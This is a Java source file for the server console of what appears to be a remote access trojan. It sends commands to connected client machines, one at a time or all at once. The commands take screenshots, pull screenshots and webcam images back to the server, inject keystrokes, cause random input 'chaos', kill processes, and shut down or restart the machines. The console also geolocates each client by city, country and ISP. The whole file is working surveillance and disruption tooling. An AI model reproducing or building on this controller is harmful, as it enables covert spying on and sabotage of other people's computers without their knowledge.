package com.github.connorf.RemoteCommander;

import static com.github.connorf.RemoteCommander.CommandConstants.*;

import com.maxmind.geoip2.DatabaseReader;
import com.maxmind.geoip2.exception.GeoIp2Exception;
import com.maxmind.geoip2.model.CityResponse;
import com.maxmind.geoip2.model.CountryResponse;
import com.maxmind.geoip2.model.IspResponse;

import java.io.File;
import java.io.IOException;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.Map;
import java.util.Scanner;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * allows for the control of the clients from the server
 */
public class ClientCommander implements Runnable
{
    /** holds all the clients that are currently connected to the server */
    private Map<InetAddress, ConnectedClient> connectedClients;

    public ClientCommander()
    {
        connectedClients = Server.getOnlineClients();
    }

    public void run()
    {
        try
        {
            waitForCommand();
        }
        catch(NullCommandException | IOException excp)
        {
            System.out.println("run() clientcommander exception");
            excp.printStackTrace();
        }
    }

    /**
     * waits for the user of the server to type a command
     */
    private void waitForCommand() throws NullCommandException, IOException
    {
        while(true)
        {
            System.out.print("> ");
            String command = new Scanner(System.in).nextLine(); // blocks

            if(commandValid(command.split("\\s+")[0]))
                parseAndSendCommand(command);
            else
                System.out.println("> Unknown command: " + command.split("\\s+")[0]);
        }
    }

    /**
     * checks to see if the command exists
     * @param command the command to check
     * @return true if the command is valid, false otherwise
     */
    private boolean commandValid(String command)
    {
        command = command.toLowerCase();
        return command.equals(CMD_KILL_PROCESS) || command.equals(CMD_LIST_PROCESSES) || command.equals(CMD_MINIMISE) || command.equals(CMD_WALLPAPER) || command.equals(CMD_ROTATE) || command.equals(CMD_SYSINFO) || command.equals(CMD_RETRIEVE) || command.equals(CMD_TYPE) || command.equals(CMD_CHAOS) || command.equals(CMD_HELP) || command.equals(CMD_COUNT) || command.equals(CMD_ONLINE) || command.equals(CMD_EJECT) || command.equals(CMD_SOUND) || command.equals(CMD_SHUTDOWN) || command.equals(CMD_RESTART) || command.equals(CMD_SCREENSHOT) || command.equals(CMD_MSG);
    }

    /**
     * properly tokenises commands, allowing for variable length arguments for commands
     * @param fullCommand the full command the user typed
     * @return a list containing each part of the command. Quoted arguments are treated as one part, for example
     * msg all "hello there" will be split into: msg, all, hello there
     */
    private ArrayList<String> tokeniseCommand(String fullCommand)
    {
        ArrayList<String> commandTokens = new ArrayList<>();
        Pattern regex = Pattern.compile("[^\\s\"']+|\"([^\"]*)\"|'([^']*)'"); // allows quoted args to be treated as one
        Matcher regexMatcher = regex.matcher(fullCommand);
        while (regexMatcher.find()) {
            if (regexMatcher.group(1) != null) {
                // Add double-quoted string without the quotes
                commandTokens.add(regexMatcher.group(1));
            } else if (regexMatcher.group(2) != null) {
                // Add single-quoted string without the quotes
                commandTokens.add(regexMatcher.group(2));
            } else {
                // Add unquoted word
                commandTokens.add(regexMatcher.group());
            }
        }
        return commandTokens;
    }

    private void printHelp(String command)
    {
        if(command == null) // user wants full help
            System.out.println("Usage:\n\t" + CMD_COUNT + "\n\t" + CMD_ONLINE + "\n\t" + CMD_HELP + "\n\t" + CMD_SYSINFO + " HOST\n\t" + CMD_MINIMISE + " HOST\n\t" + CMD_LIST_PROCESSES + " HOST\n\t" + CMD_EJECT + " HOST\n\t" + CMD_SHUTDOWN + " HOST\n\t" + CMD_RESTART + " HOST\n\t" + CMD_SCREENSHOT + " HOST\n\t" + CMD_SOUND + " HOST /path/to/local/sound/file\n\t" + CMD_WALLPAPER + " HOST /path/to/local/image/file\n\t" + CMD_ROTATE + " HOST ORIENTATION\n\t" + CMD_MSG + " \"message body\" \"message box title\" type\n\t" + CMD_KILL_PROCESS + " HOST TYPE ARG\n\t" + CMD_CHAOS + " HOST DURATION DELAY\n\t" + CMD_TYPE + " HOST \"message to type here\"\nHOST can either be a specified IP address or the word all (to send to every online client)");
        else
        {
            if(command.equals(CMD_COUNT))
                System.out.println(CMD_COUNT + " displays the number of currently connected clients.\nExample usage:\n\t" + CMD_COUNT);
            else if(command.equals(CMD_ONLINE))
                System.out.println(CMD_ONLINE + " displays info about each of the connected clients, this includes their IP address and geolocation.\nExample usage:\n\t" + CMD_ONLINE);
            else if(command.equals(CMD_EJECT))
                System.out.println(CMD_EJECT + " will eject the disk / disk tray on the client.\nExample usage:\n\t" + CMD_EJECT + " 127.0.0.1");
            else if(command.equals(CMD_SHUTDOWN))
                System.out.println(CMD_SHUTDOWN + " will turn off the clients computer.\nExample usage:\n\t" + CMD_SHUTDOWN + " 127.0.0.1");
            else if(command.equals(CMD_RESTART))
                System.out.println(CMD_RESTART + " will restart the clinets computer.\nExample usage:\n\t" + CMD_RESTART + " 127.0.0.1");
            else if(command.equals(CMD_SCREENSHOT))
                System.out.println(CMD_SCREENSHOT + " will take a screenshot of the clients screen.\nExample usage:\n\t" + CMD_SCREENSHOT + " 127.0.0.1");
            else if(command.equals(CMD_SOUND))
                System.out.println(CMD_SOUND + " will play a sound on the clients computer.\nExample usage:\n\t" + CMD_SOUND + " 127.0.0.1 /path/to/local/sound/file");
            else if(command.equals(CMD_MSG))
                System.out.println(CMD_MSG + " will send a message that will be displayed as a message box on the clients computer.\nExample usage:\n\t" + CMD_MSG + " 127.0.0.1 \"message body\" \"title of the message box\" type\ntype can be any of the following: error, info, warning");
            else if(command.equals(CMD_CHAOS))
                System.out.println(CMD_CHAOS + " will randomly press keys, move the mouse and click the mouse buttons on the clients computer.\nExample usage:\n\t" + CMD_CHAOS + " 127.0.0.1 DURATION DELAY\nDURATION is the time in ms for the chaos to last\nDELAY is the time in ms between each random act of chaos");
            else if(command.equals(CMD_TYPE))
                System.out.println(CMD_TYPE + " will type the provided message on the clients computer.\nExample usage:\n\t" + CMD_TYPE + " 127.0.0.1 \"this is will get typed out\"");
            else if(command.equals(CMD_RETRIEVE))
                System.out.println(CMD_RETRIEVE + " will get all the screenshots/webcam images taken on the clients computer and transfer them to the server.\nExample usage:\n\t" + CMD_RETRIEVE + " 127.0.0.1");
            else if(command.equals(CMD_SYSINFO))
                System.out.println(CMD_SYSINFO + " will return the client's operating system.\nExample usage:\n\t" + CMD_SYSINFO + " 127.0.0.1");
            else if(command.equals(CMD_ROTATE))
                System.out.println(CMD_ROTATE + " will rotate the clients screen depending on the supplied rotation.\nExample usage:\n\t" + CMD_ROTATE + " 127.0.0.1 ORIENTATION\nORIENTATION can be either: left, right, up, down");
            else if(command.equals(CMD_WALLPAPER))
                System.out.println(CMD_WALLPAPER + " will change the clients desktop wallpaper image.\nExample usage:\n\t" + CMD_WALLPAPER + " 127.0.0.1 /path/to/local/image/file");
            else if(command.equals(CMD_MINIMISE))
                System.out.println(CMD_MINIMISE + " will minimise all open applications on the clients machine.\nExample usage:\n\t" + CMD_MINIMISE + " 127.0.0.1");
            else if(command.equals(CMD_LIST_PROCESSES))
                System.out.println(CMD_LIST_PROCESSES + " will list all running processes on the clients machine.\nExample usage:\n\t" + CMD_LIST_PROCESSES + " 127.0.0.1");
            else if(command.equals(CMD_KILL_PROCESS))
                System.out.println(CMD_KILL_PROCESS + " will kill the process on the clients machine.\nExample usage:\n\t" + CMD_KILL_PROCESS + " 127.0.0.1 TYPE ARG\nTYPE can either be pid (process id) or name\nARG must be a valid process id if using the TYPE pid or a valid process name if using the TYPE name");

        }
    }

    /**
     * calls the correct method according to argument provided. This is used for commands with no arguments, e.g. count, online, help
     * @param cmd the no argument command to be processed
     */
    private void processZeroArgCommand(String cmd)
    {
        switch(cmd)
        {
            case CMD_ONLINE:
                printOnlineClients();
                break;
            case CMD_COUNT:
                printOnlineCount();
                break;
            case CMD_HELP:
                printHelp(null);
                break;
            default:
        }
    }

    private ConnectedClient getClientFromIPAddress(String ipAddress) throws UnknownHostException
    {
        return connectedClients.get(InetAddress.getByName(ipAddress));
    }

    /**
     * processes one argument commands, e.g. sysinfo, retrieve, screenshot, eject, shutdown, restart, help, mini, lsprocs
     * @param cmd the command itself, e.g. count
     * @param arg argument for the command
     * @throws UnknownHostException if the supplied IP address doesn't match any online clients
     * @throws IOException if something went wrong printing os info via sysinfo
     */
    private void processOneArgCommand(String cmd, String arg) throws UnknownHostException, IOException
    {
        if(cmd.equals(CMD_HELP))
        {
            printHelp(arg);
            return;
        }

        ConnectedClient target = null;
        if(arg.equals(HOST_ALL))
            sendCommandAll(cmd);
        else // otherwise get specified client
            target = getClientFromIPAddress(arg);

        if(target != null)
        {
            target.sendCommandPart(cmd);
            if(cmd.equals(CMD_SYSINFO))
                System.out.println(target.getStringFromClient());
            else if(cmd.equals(CMD_RETRIEVE))
                target.retrieve();
            else if(cmd.equals(CMD_LIST_PROCESSES))
                System.out.println(target.getStringFromClient());
        }
    }

    /**
     * processes two argument commands, e.g. wallpaper, sound, type, rotate
     * @param cmd the command itself, e.g. sound
     * @param host the IP address of the host to perform the command on, or all
     * @param arg an argument for the command
     * @throws UnknownHostException if the client couldn't be found from the supplied IP address
     * @throws IOException if something went wrong sending the file (if the cmd needed to) to the client
     */
    private void processTwoArgCommand(String cmd, String host, String arg) throws UnknownHostException, IOException
    {
        ConnectedClient target = null;
        if(host.equals(HOST_ALL))
        {
            sendCommandAll(cmd);
            File toSend;
            if(cmd.equals(CMD_SOUND))
            {
                toSend = new File(arg);
                sendFileAll(toSend, (int)toSend.length());
            }
            else if(cmd.equals(CMD_WALLPAPER))
            {
                toSend = new File(arg);
                sendFileAll(toSend, (int)toSend.length());
            }
            else
                sendCommandAll(arg);
        }
        else
            target = getClientFromIPAddress(host);

        if(target != null)
        {
            target.sendCommandPart(cmd);
            File toSend;
            if(cmd.equals(CMD_SOUND))
            {
                toSend = new File(arg);
                target.sendFile(toSend, (int)toSend.length());
            }
            else if(cmd.equals(CMD_WALLPAPER))
            {
                toSend = new File(arg);
                target.sendFile(toSend, (int)toSend.length());
            }
            else
                target.sendCommandPart(arg);
        }
    }

    /**
     * processes three argument commands, e.g. chaos
     * @param cmd the command itself, e.g. chaos
     * @param host the IP address of the host or all
     * @param arg1 the argument for the command
     * @param arg2 another argument for the command
     * @throws UnknownHostException if the host could not be found from the supplied IP address
     */
    private void processThreeArgCommand(String cmd, String host, String arg1, String arg2) throws UnknownHostException
    {
        ConnectedClient target = null;
        if(host.equals(HOST_ALL))
        {
            sendCommandAll(cmd);
            sendCommandAll(arg1);
            sendCommandAll(arg2);
        }
        else
        {
            target = getClientFromIPAddress(host);
            target.sendCommandPart(cmd);
            target.sendCommandPart(arg1);
            target.sendCommandPart(arg2);
        }
    }

    /**
     * processes four argument commands, e.g. msg
     * @param cmd command itself, e.g. msg
     * @param host the host IP address or all
     * @param arg1 arg for the command
     * @param arg2 arg for the command
     * @param arg3 arg for the command
     * @throws UnknownHostException if the provided IP address doesn't match any online clients
     */
    private void processFourArgCommand(String cmd, String host, String arg1, String arg2, String arg3) throws UnknownHostException
    {
        ConnectedClient target = null;
        if(host.equals(HOST_ALL))
        {
            sendCommandAll(cmd);
            sendCommandAll(arg1);
            sendCommandAll(arg2);
            sendCommandAll(arg3);
        }
        else
        {
            target = getClientFromIPAddress(host);
            target.sendCommandPart(cmd);
            target.sendCommandPart(arg1);
            target.sendCommandPart(arg2);
            target.sendCommandPart(arg3);
        }
    }

    /**
     * uses the command input by the server user to execute the command on the
     * specified clients
     * @param fullCommand the users command input. Different commands have different args.
     */
    private void parseAndSendCommand(String fullCommand)
    {
        ArrayList<String> commandTokens = tokeniseCommand(fullCommand);
        String command = commandTokens.get(0);

        try
        {
            if(commandTokens.size() == 1)
                processZeroArgCommand(command);
            else if(commandTokens.size() == 2)
                processOneArgCommand(command, commandTokens.get(1));
            else if(commandTokens.size() == 3)
                processTwoArgCommand(command, commandTokens.get(1), commandTokens.get(2));
            else if(commandTokens.size() == 4)
                processThreeArgCommand(command, commandTokens.get(1), commandTokens.get(2), commandTokens.get(3));
            else if(commandTokens.size() == 5)
                processFourArgCommand(command, commandTokens.get(1), commandTokens.get(2), commandTokens.get(3), commandTokens.get(4));
            else
                System.out.println("Unknown command: " + fullCommand);
        }
        catch(UnknownHostException uhe)
        {
            System.out.println("Unknown host provided. Try running online to see if the client is online");
        }
        catch(IOException ioe)
        {
            System.err.println("Something went wrong sending files over to the client");
        }
    }

    private void sendFileAll(File toSend, int size) throws IOException
    {
        for (Map.Entry<InetAddress, ConnectedClient> client : connectedClients.entrySet())
            client.getValue().sendFile(toSend, size);
    }

    /**
     * iterates through each connected client and issues the command
     * @param command the command(s) to send to each client
     */
    private void sendCommandAll(String command)
    {
        for (Map.Entry<InetAddress, ConnectedClient> client : connectedClients.entrySet())
            client.getValue().sendCommandPart(command);
    }

    /**
     * called when the "count" command is used
     * prints out the number of currently connected clients
     */
    private void printOnlineCount()
    {
        System.out.println("Online: " + connectedClients.size());
    }

    /**
     * prints online client info including their rough location in the world (city & country) and the ISP detected
     */
    private void printOnlineClients()
    {
        File countryDB = new File("geolocation/GeoLite2-Country.mmdb");
        File cityDB = new File("geolocation/GeoLite2-City.mmdb");
        DatabaseReader countryReader = null;
        DatabaseReader cityReader = null;
        try
        {
            countryReader = new DatabaseReader.Builder(countryDB).build();
            cityReader = new DatabaseReader.Builder(cityDB).build();
        }
        catch(IOException ioe)
        {
            System.err.println("Failed create DB readers");
        }

        for(Map.Entry<InetAddress, ConnectedClient> client : connectedClients.entrySet())
        {
            System.out.print(client.getKey().toString().replace("/", ""));
            try
            {
                CountryResponse country = countryReader.country(client.getKey());
                CityResponse city = cityReader.city(client.getKey());
                IspResponse isp = cityReader.isp(client.getKey());
                System.out.println("\t[ " + city.getCity() + ", " + country.getCountry() + ", " + isp.getIsp() + " ]");
            }
            catch(NullPointerException | IOException | GeoIp2Exception geoExcp)
            {
                System.out.println("\t[ UNKNOWN ]");
            }
        }

        try
        {
            countryReader.close();
            cityReader.close();
        }
        catch(IOException ioe)
        {
            System.err.println("Failed to close DB readers");
        }
    }
}
